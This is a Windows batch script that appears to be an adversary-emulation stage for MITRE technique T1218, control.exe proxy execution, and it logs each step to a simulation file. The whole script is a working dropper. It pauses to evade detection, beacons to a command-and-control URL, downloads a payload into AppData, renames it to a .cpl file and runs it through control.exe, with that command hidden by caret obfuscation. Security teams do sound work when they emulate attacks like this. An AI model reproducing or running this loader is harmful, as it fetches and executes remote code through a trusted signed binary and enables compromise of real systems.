@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET smpljft=%APPDATA%\8870\79a69cd2
SET hbwot=Macula-Stage0-8870
SET zxkcqp=https://10.0.0.49
SET tpqzfe=https://10.0.0.49/stage/2/icon.png?8870-10
SET sckxkt=BALAM-S2BO
SET ixeclv=10
SET khjyq=chr0me.txt
SET umhweq=8870
SET fwrqik=%APPDATA%\!ixeclv!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!sckxkt!]: script_init=start>> "!fwrqik!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!sckxkt!]: delay_45s_complete>> "!fwrqik!" 2>nul

curl -k -s -o nul "!tpqzfe!"
echo [!DATE! !TIME!][DEBUG][!sckxkt!]: c2_heartbeat=!tpqzfe!>> "!fwrqik!" 2>nul

ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!sckxkt!]: delay_8ping_complete>> "!fwrqik!" 2>nul

SET dwncmd=curl^ -k^ -s^ -o^ "!smpljft!\!khjyq!"^ "!zxkcqp!"
!dwncmd!
echo [!DATE! !TIME!][DEBUG][!sckxkt!]: file_download_start>> "!fwrqik!" 2>nul
SET /A delay=!RANDOM! %% 15 + 5
timeout /t !delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!sckxkt!]: delay_random_!delay!s_complete>> "!fwrqik!" 2>nul

IF EXIST "!smpljft!\!khjyq!" (
    RENAME "!smpljft!\!khjyq!" file.cpl
    echo [!DATE! !TIME!][DEBUG][!sckxkt!]: rename_to_cpl_complete>> "!fwrqik!" 2>nul
    SET cplres=1
    SET cplexec=c^o^n^t^r^o^l^.^e^x^e^ ^f^i^l^e^.^c^p^l
    !cplexec!
    IF !ERRORLEVEL! EQU 0 (
        SET ttp_result=1
        SET err_detail=
    ) ELSE (
        SET ttp_result=0
        SET err_detail=control_exe_failed
    )
) ELSE (
    SET ttp_result=0
    SET err_detail=download_failed
)

echo [!DATE! !TIME!][DEBUG][!sckxkt!]: dll_execution_result=!ERRORLEVEL!>> "!fwrqik!" 2>nul
SET ttp_time=!DATE:~-4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME!
echo [!ttp_time!][!sckxkt!]: !ixeclv!-!umhweq!-T1218|Signed_Binary_Proxy_Execution_Control=!ttp_result!:!err_detail!>> "!fwrqik!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!sckxkt!]: script_exit>> "!fwrqik!" 2>nul